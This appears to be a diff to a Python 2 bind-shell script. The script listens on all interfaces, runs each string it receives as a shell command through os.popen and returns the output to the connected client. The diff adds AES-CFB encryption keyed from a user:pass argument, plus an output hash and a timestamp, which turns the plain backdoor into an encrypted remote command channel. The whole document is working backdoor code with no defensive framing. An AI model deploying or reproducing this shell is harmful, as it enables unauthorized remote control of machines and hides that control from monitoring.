@@ -1,25 +1,48 @@
 import socket as skt
 import os
 import sys
+import time
+import hashlib as hl
+from Crypto.Cipher import AES
+from Crypto import Random
+
+
+def encrypt(key,data):
+        k = hl.sha512(key).digest()[0:16]
+        iv = Random.new().read(AES.block_size)
+        cipher = AES.new(k,AES.MODE_CFB,iv)
+        cdata = iv + cipher.encrypt(data)
+        return cdata
+
+def decrypt(key,cdata):
+        k = hl.sha512(key).digest()[0:16]
+        iv = cdata[0:16]
+        ndata = cdata[16:]
+        decipher= AES.new(k,AES.MODE_CFB,iv)
+        data = decipher.decrypt(ndata)
+	return data
+
 
 if len(sys.argv) == 3:
         port = int(sys.argv[1])
         auth = sys.argv[2]
         up = auth.split(':')
         user = up[0]
-        passw = up[1]
+        passwd = up[1]
 else:
-        print 'Need to specify   <listenport> <user:pass>'
+        print 'Need to specify   <listenport> <user:pass>  '
         sys.exit()
-
-s = skt.socket(skt.AF_INET,skt.SOCK_STREAM)
+s = skt.socket(skt.AF_INET, skt.SOCK_STREAM)
 s.setsockopt(skt.SOL_SOCKET, skt.SO_REUSEADDR, 1)
 s.bind(('0.0.0.0',port)) 
 s.listen(10)
 conn,addr = s.accept()
 
 while 1: 
-	data = conn.recv(1024) 
+	cdata = conn.recv(1024) 
+	print len(cdata) 
+	data = decrypt(user + passwd, cdata)
+	print 'DATA: '+data
 	if 'quit' in data:
 		conn.send('BYE!')
 		conn.close() 
@@ -28,7 +51,14 @@ while 1:
 
 	pr = os.popen(data)
 	ln = pr.readlines()
-	for strf in ln:
-		conn.send(strf) 
+	buf = ''.join(ln)
+	hbuf = hl.sha384(buf).hexdigest() 
+	msg = 'OutputHash is: ' + hbuf + '\n'
+	moment = time.ctime() + '\n\n'
+	tmsg = msg + moment + buf
+	tl = len(tmsg)
+	ctbuf = encrypt(user + passwd, tmsg.ljust(tl + 16-(tl%16))) 
+
+	conn.send(ctbuf) 
 	pr.close()
 	
